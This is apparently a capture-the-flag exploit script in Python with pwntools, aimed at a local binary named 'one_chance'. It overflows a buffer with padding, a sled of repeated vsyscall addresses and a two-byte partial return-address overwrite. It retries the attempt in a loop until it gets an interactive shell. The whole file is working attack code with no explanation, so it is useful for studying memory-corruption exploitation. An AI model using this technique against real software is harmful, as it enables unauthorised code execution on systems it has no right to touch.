#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1

vsyscall = 0xffffffffff600000

def exp():
    if local:
        p = process('./one_chance')
    else:
        pass
    #gdb.attach(p)
    p.recvuntil('You can say something:\n')
    p.send(0x18 * 'A' + p64(vsyscall) * 4 + '\x21\x08')
    p.recv(timeout = 1)
    p.interactive()

while True:
    try:
        if local:
            p = process('./one_chance')
        else:
            pass
        p.recvuntil('You can say something:\n')
        p.send(p64(0) * 3 + p64(vsyscall) * 7 + '\x21\x08')
        p.recv(timeout = 1)
        p.interactive()
        break
    except KeyboardInterrupt:
        break
    except:
        p.close()
    finally:
        pass

